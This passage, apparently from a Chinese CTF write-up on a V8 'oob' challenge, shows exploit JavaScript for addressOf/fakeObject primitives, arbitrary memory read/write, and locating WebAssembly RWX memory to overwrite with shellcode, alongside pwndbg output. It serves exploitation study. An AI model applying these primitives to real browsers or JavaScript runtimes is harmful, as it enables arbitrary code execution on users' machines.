class="hljs-comment">//fake obj by addr</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObject</span>(<span class="hljs-params">addr</span>)&#123;<br><br>  flo_arr[<span class="hljs-number">0</span>]=<span class="hljs-title function_">i2f</span>(addr+<span class="hljs-number">1</span>);<br><br>  flo_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">let</span> fake_obj=flo_arr[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">//recover</span><br><br>  flo_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">return</span> fake_obj;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>测试 </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> f64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(<span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">var</span> bigUint64 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(f64.<span class="hljs-property">buffer</span>);<br><br><span class="hljs-keyword">var</span> obj = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>&#125;;<br><br><span class="hljs-keyword">var</span> obj_arr = [obj];<br><br><span class="hljs-keyword">var</span> flo_arr = [<span class="hljs-number">1.1</span>];<br><br>obj_arr_map=obj_arr.<span class="hljs-title function_">oob</span>();<br><br>flo_arr_map=flo_arr.<span class="hljs-title function_">oob</span>();<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;obj_arr_map:0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">f2i</span>(obj_arr_map)));<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;flo_arr_map:0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">f2i</span>(flo_arr_map)));<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;====================================&quot;</span>)<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">f2i</span>(<span class="hljs-params">f</span>)<br><br>&#123;<br><br> f64[<span class="hljs-number">0</span>] = f;<br><br> <span class="hljs-keyword">return</span> bigUint64[<span class="hljs-number">0</span>];<br><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">i2f</span>(<span class="hljs-params">i</span>)<br><br>&#123;<br><br>  bigUint64[<span class="hljs-number">0</span>] = i;<br><br>  <span class="hljs-keyword">return</span> f64[<span class="hljs-number">0</span>];<br><br>&#125;<br><br> <br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">i</span>)<br><br>&#123;<br><br>  <span class="hljs-keyword">return</span> i.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;0&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//leak obj memory address</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj</span>)&#123;<br><br>  obj_arr[<span class="hljs-number">0</span>]=obj;<br><br>  obj_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">let</span> obj_addr=<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">f2i</span>(obj_arr[<span class="hljs-number">0</span>]));<br><br>  <span class="hljs-comment">//recover</span><br><br>  obj_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">return</span> obj_addr;<br><br>&#125;<br><br><span class="hljs-comment">//fake obj by addr</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObject</span>(<span class="hljs-params">addr</span>)&#123;<br><br>  flo_arr[<span class="hljs-number">0</span>]=<span class="hljs-title function_">i2f</span>(addr+<span class="hljs-number">1</span>);<br><br>  flo_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">let</span> fake_obj=flo_arr[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">//recover</span><br><br>  flo_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">return</span> fake_obj;<br><br>&#125;<br><br> <br><br> <br><br><span class="hljs-keyword">var</span> test_obj=&#123;&#125;;<br><br>%<span class="hljs-title class_">DebugPrint</span>(test_obj);<br><br><span class="hljs-keyword">var</span> test_obj_addr=<span class="hljs-title function_">addressOf</span>(test_obj);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;leak obj addr:0x&quot;</span>+test_obj_addr);<br></code></pre></td></tr></table></figure><p>成功泄露 testobj地址 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">➜ v8 git:(6dc88c191f) ✗ ./out/x64_startctf.release/d8 --allow-natives-syntax ./test.js<br><br>obj_arr_map:0x3fa5718c2f79<br><br>flo_arr_map:0x3fa5718c2ed9<br><br>====================================<br><br>0x0f696c58edc9 &lt;Object map = 0x3fa5718c0459&gt;<br><br>leak obj addr:0xf696c58edc9<br></code></pre></td></tr></table></figure><h5 id="实现任意地址读写"><a href="#实现任意地址读写" class="headerlink" title="实现任意地址读写"></a>实现任意地址读写</h5><p>实现任意地址读写可以通过fake一个对象,这个对象的任何属性我们都是可控的,然后将elements字段修改为我们要读取或修改的内存地址,就可以实现任意地址读写. 但是有几个问题需要解决,需要查找elements的内存地址,可以通过elements字段与map字段的偏移计算. 可以看出,elements字段为0x2b131b9cec19,位于map字段的低地址处,与存储map字段的地址:0x2b131b9cec48,偏移为0x10. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x2b131b9cec49</span><br><br>0x2b131b9cec49: [JSArray]<br><br> \- map: 0x14e6ac9c2ed9 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]<br><br> \- prototype: 0x3727cfcd1111 &lt;JSArray[0]&gt;<br><br> \- elements: 0x2b131b9cec19 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]<br><br> \- length: 4<br><br> \- properties: 0x00a2a3840c71 &lt;FixedArray[0]&gt; &#123;<br><br>  \#length: 0x373c6a3001a9 &lt;AccessorInfo&gt; (const accessor descriptor)<br><br> &#125;<br><br> \- elements: 0x2b131b9cec19 &lt;FixedDoubleArray[4]&gt; &#123;<br><br>​      0: 1<br><br>​      1: 2<br><br>​      2: 3<br><br>​      3: 1.1<br><br> &#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x2b131b9cec48</span><br><br>00:0000│ 0x2b131b9cec48 —▸ 0x14e6ac9c2ed9 ◂— 0x4000000a2a38401<br><br>01:0008│ 0x2b131b9cec50 —▸ 0xa2a3840c71 ◂— 0xa2a38408<br><br>02:0010│ 0x2b131b9cec58 —▸ 0x2b131b9cec19 ◂— 0xa2a38414<br><br>03:0018│ 0x2b131b9cec60 ◂— 0x400000000<br><br>04:0020│ 0x2b131b9cec68 ◂— 0x0<br><br>... ↓   3 skipped<br><br><span class="hljs-meta prompt_"> </span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x2b131b9cec18</span><br><br>00:0000│ 0x2b131b9cec18 —▸ 0xa2a38414f9 ◂— 0xa2a38401<br><br>01:0008│ 0x2b131b9cec20 ◂— 0x400000000<br><br>02:0010│ 0x2b131b9cec28 ◂— 0x3ff0000000000000<br><br>03:0018│ 0x2b131b9cec30 ◂— 0x4000000000000000<br><br>04:0020│ 0x2b131b9cec38 ◂— 0x4008000000000000<br><br>05:0028│ 0x2b131b9cec40 ◂— 0x3ff199999999999a<br><br>06:0030│ 0x2b131b9cec48 —▸ 0x14e6ac9c2ed9 ◂— 0x4000000a2a38401<br><br>07:0038│ 0x2b131b9cec50 —▸ 0xa2a3840c71 ◂— 0xa2a38408<br></code></pre></td></tr></table></figure><p>知道了变量的内存结构,下面开始手动构造一个arr,通过addressof获取这个变量elements元素值的地址,并将其fake为一个对象.然后通过fake_arr修改fake对象的elements字段,并通过fake对象读取或写入,可以实现任意地址的读写操作. </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//leak obj memory address</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">addressOf</span>(<span class="hljs-params">obj</span>)&#123;<br><br>  obj_arr[<span class="hljs-number">0</span>]=obj;<br><br>  obj_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">let</span> obj_addr=obj_arr[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">//recover</span><br><br>  obj_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">f2i</span>(obj_addr);<br><br>&#125;<br><br><span class="hljs-comment">//fake obj by addr</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">fakeObject</span>(<span class="hljs-params">addr</span>)&#123;<br><br>  flo_arr[<span class="hljs-number">0</span>]=<span class="hljs-title function_">i2f</span>(addr);<br><br>  flo_arr.<span class="hljs-title function_">oob</span>(obj_arr_map);<br><br>  <span class="hljs-keyword">let</span> fake_obj=flo_arr[<span class="hljs-number">0</span>];<br><br>  <span class="hljs-comment">//recover</span><br><br>  flo_arr.<span class="hljs-title function_">oob</span>(flo_arr_map);<br><br>  <span class="hljs-keyword">return</span> fake_obj;<br><br>&#125;<br><br> <br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>)&#123;<br><br>  fake_arr[<span class="hljs-number">2</span>]=<span class="hljs-title function_">i2f</span>(addr-<span class="hljs-number">0x10n</span>+<span class="hljs-number">0x1n</span>);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;elements:0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">f2i</span>(fake_arr[<span class="hljs-number">2</span>])));<br><br>  <span class="hljs-keyword">let</span> ret_data=<span class="hljs-title function_">f2i</span>(fake_obj[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-comment">//%SystemBreak();</span><br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;read addr:0x:&quot;</span>+<span class="hljs-title function_">hex</span>(addr)+<span class="hljs-string">&quot; val:0x&quot;</span>+<span class="hljs-title function_">hex</span>(ret_data));<br><br>  <span class="hljs-keyword">return</span> ret_data;<br><br>&#125;<br><br> <br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64</span>(<span class="hljs-params">addr,data</span>)&#123;<br><br>  fake_arr[<span class="hljs-number">2</span>]=<span class="hljs-title function_">i2f</span>(addr-<span class="hljs-number">0x10n</span>+<span class="hljs-number">0x1n</span>);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;elements:0x&quot;</span>+<span class="hljs-title function_">hex</span>(<span class="hljs-title function_">f2i</span>(fake_arr[<span class="hljs-number">2</span>])));<br><br>  <span class="hljs-comment">//%SystemBreak();</span><br><br>  fake_obj[<span class="hljs-number">0</span>]=<span class="hljs-title function_">i2f</span>(data);<br><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;write addr:0x&quot;</span>+<span class="hljs-title function_">hex</span>(addr)+<span class="hljs-string">&quot; val:0x&quot;</span>+<span class="hljs-title function_">hex</span>(data));<br><br>&#125;<br><br> <br><br>fake_arr=[<br><br>  flo_arr_map,<br><br>  <span class="hljs-title function_">i2f</span>(<span class="hljs-number">0n</span>),<br><br>  <span class="hljs-title function_">i2f</span>(<span class="hljs-number">0x41414141n</span>),<br><br>  <span class="hljs-title function_">i2f</span>(<span class="hljs-number">0x1000000000n</span>),<br><br> <span class="hljs-number">1.1</span>,<br><br> <span class="hljs-number">2.2</span><br><br>];<br><br>fake_addr=<span class="hljs-title function_">addressOf</span>(fake_arr);<br><br><span class="hljs-comment">//get elements:value &amp; fake obj</span><br><br><span class="hljs-keyword">var</span> fake_obj_addr=fake_addr-<span class="hljs-number">0x30n</span>;<br><br>fake_obj=<span class="hljs-title function_">fakeObject</span>(fake_obj_addr);<br></code></pre></td></tr></table></figure><h5 id="通过wasm执行shellcode"><a href="#通过wasm执行shellcode" class="headerlink" title="通过wasm执行shellcode"></a>通过wasm执行shellcode</h5><p>wasm可以将js生成为机器码执行,运行时会开辟一段具有rwxp属性的内存空间用于执行wasm code,但是本身无法调用一些系统库,因为做了限制,调用一些系统库会报错,但是我们可以找到这个内存空间,将自己的shellcode写入其中,覆盖wasm code,然后调用wasm执行. wasm demo，可以将c 转换为wasm code的网站:<a href="https://wasdk.github.io/WasmFiddle/">https://wasdk.github.io/WasmFiddle/</a> </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs javascript">int <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123; <br><br> <span class="hljs-keyword">return</span> <span class="hljs-number">42</span>;<br><br>&#125;<br><br><span class="hljs-keyword">var</span> wasmCode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0</span>,<span class="hljs-number">97</span>,<span class="hljs-number">115</span>,<span class="hljs-number">109</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">133</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">96</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">127</span>,<span class="hljs-number">3</span>,<span class="hljs-number">130</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">112</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">131</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">129</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">145</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">109</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">121</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">10</span>,<span class="hljs-number">138</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">132</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">128</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">65</span>,<span class="hljs-number">42</span>,<span class="hljs-number">11</span>]);<br><br><span class="hljs-keyword">var</span> wasmModule = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Module</span>(wasmCode);<br><br><span class="hljs-keyword">var</span> wasmInstance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>.<span class="hljs-title class_">Instance</span>(wasmModule, &#123;&#125;);<br><br><span class="hljs-keyword">var</span> f = wasmInstance.<span class="hljs-property">exports</span>.<span class="hljs-property">main</span>;<br><br><span class="hljs-keyword">var</span> f_addr = <span class="hljs-title function_">addressOf</span>(f);<br><br>%<span class="hljs-title class_">DebugPrint</span>(f);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">hex</span>(f_addr));<br><br>%<span class="hljs-title class_">SystemBreak</span>();<br><br><span class="hljs-number">0x07a6bbc611f9</span> &lt;<span class="hljs-title class_">JSFunction</span> <span class="hljs-number">0</span> (sfi = <span class="hljs-number">0x7a6bbc611c1</span>)&gt;<br><br>wasm func <span class="hljs-attr">addr</span>: <span class="hljs-number">0x7a6bbc611f9</span><br></code></pre></td></tr></table></figure><p>使用vmmap命令可以看到这个内存空间 </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x2b7465e6a000</span>   <span class="hljs-number">0</span>x2b7465e6b000 rwxp   <span class="hljs-number">1000</span> <span class="hljs-number">0</span>  <span class="hljs-meta"> [anon_2b7465e6a]</span><br></code></pre></td></tr></table></figure><p>这片内存空间肯定是跟我们输出的函数地址是有关联的,因为wasm会在这片空间中执行. </p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; job 0x07a6bbc611f9</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">0x7a6bbc611f9</span><span class="hljs-punctuation">:</span> <span class="hljs-string">[Function] in OldSpace</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">map: 0x123928784379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">prototype: 0x07a6bbc42109 &lt;JSFunction (sfi = 0x2e1f8d0c3b29)&gt;</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">elements: 0x39e2f2600c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">function prototype: &lt;no-prototype-slot&gt;</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">shared_info: 0x07a6bbc611c1 &lt;SharedFunctionInfo 0&gt;</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">name: 0x39e2f2604ae1 &lt;String[#1]: 0&gt;</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">formal_parameter_count: 0</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">kind: NormalFunction</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">context: 0x07a6bbc41869 &lt;NativeContext[246]&gt;</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">code: 0x0f3b636c2001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">WASM instance 0x7a6bbc61001</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">WASM function index 0</span><br><br> <span class="hljs-bullet">-</span> <span class="hljs-string">properties: 0x39e2f2600c71 &lt;FixedArray[0]&gt; &#123;</span><br><br> <span class="hljs-comment">#length: 0x2e1f8d0c04b9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><br> <span class="hljs-comment">#name: 0x2e1f8d0c0449 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><br> <span class="hljs-comment">#arguments: 0x2e1f8d0c0369 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><br> <span class="hljs-comment">#caller: 0x2e1f8d0c03d9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><br> <span class="hljs-attribute">&#125;</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute"> </span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute"> \- feedback vector</span><span class="hljs-punctuation">:</span> <span class="hljs-string">not available</span><br></code></pre></td></tr></table></figure><p>通过fun_addr-&gt;share_info-&gt;data-&gt;instance+0x88这个结构,最终找到的这块内存的起始地址, 或者通过wasmInstance+0x88也可以. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 